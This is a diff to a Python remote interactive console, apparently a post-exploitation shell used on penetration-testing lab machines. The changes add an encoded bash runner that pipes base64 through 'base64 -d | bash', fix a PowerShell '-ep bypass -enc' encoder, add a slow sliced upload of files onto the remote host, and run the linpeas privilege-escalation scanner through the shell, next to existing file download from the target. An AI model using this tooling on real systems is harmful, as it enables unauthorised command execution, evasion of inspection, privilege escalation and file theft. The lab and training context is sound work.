@@ -35,7 +35,10 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
         return f"os.system(\"\"\"{source[1:]}\"\"\")"
 
     def remote_powershell_call(self, powershell):
-        return f"powershell.exe -ep bypass -enc {base64.b64encode(powershell.encode("utf-16le"))}"
+        return f"powershell.exe -ep bypass -enc {base64.b64encode(powershell.encode("utf-16le")).decode()}"
+
+    def remote_bash_call(self, bash):
+        return f"echo '{base64.b64encode(bash.encode()).decode()}' | base64 -d | bash"
 
     def special_command(self, source, filename, symbol):
         if source == "exit" or source == "quit":
@@ -44,6 +47,10 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
             #upload
             _, local_file, remote_file = source.split(" ")
             return self.upload_file(local_file, remote_file)
+        elif source.startswith("uploadsliced"):
+            #upload sliced for bad machines like offsec trash
+            _, local_file, remote_file = source.split(" ")
+            return self.upload_file_sliced(local_file, remote_file)
         elif source.startswith("download"):
             #download
             _, remote_file, local_file = source.split(" ")
@@ -86,7 +93,8 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
             path = "/usr/share/peass/linpeas/linpeas.sh"
             with open(path) as f:
                 bash = f.read()
-            return self.remote_os_system_call(bash)
+            new_source = self.remote_bash_call(bash)
+            return self.remote_os_system_call(new_source)
 
 
     def upload_file(self, local_file, remote_file):
@@ -96,6 +104,21 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
         content = base64.b64encode(content)
         source = f"""import base64\nfrom hashlib import md5\nwith open('{remote_file}', 'wb') as f:\n\tcontent=base64.b64decode({content})\n\tf.write(content)\n\tprint(md5(content).hexdigest()=='{hashed}')"""
         return source
+
+    def upload_file_sliced(self,local_file, remote_file):
+        with open(local_file, "rb") as f:
+            content = f.read()
+        hashed = md5(content).hexdigest()
+        touch = f"""with open('{remote_file}', 'w') as f:\n\tpass\n"""
+        self.runsource(touch, None, None)
+        for i in range(0,len(content), 10):
+            slice = content[i:i+10]
+            slice = base64.b64encode(slice)
+            source = f"""import base64\nwith open('{remote_file}', 'ab+') as f:\n\tcontent=base64.b64decode({slice})\n\tf.write(content)"""
+            self.runsource(source, None, None)
+        content = base64.b64encode(content)
+        return f"from hashlib import md5\nprint(md5(base64.b64decode({content})).hexdigest()=='{hashed}')"
+
 
     def download_file(self, remote_file, local_file):
         source = f"""import base64\nfrom hashlib import md5\nwith open('{remote_file}', 'rb') as f:\n\tcontent=base64.b64encode(f.read())\n\tprint(content.decode())"""
@@ -160,6 +183,7 @@ class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
         print("use & for special commands")
         print("&exit to exit")
         print("&upload <local> <remote> to upload")
+        print("&uploadsliced <local> <remote> to upload in 10 byte slices.. this is slow and only for emergencies on offsec trash boxes")
         print("&download <remote> <local> to download")
         print("&winpeas run winpeas from the local the kali path (/usr/share/peass/)")
         print("&linpeas run linpeas from the local the kali path (/usr/share/peass/)")
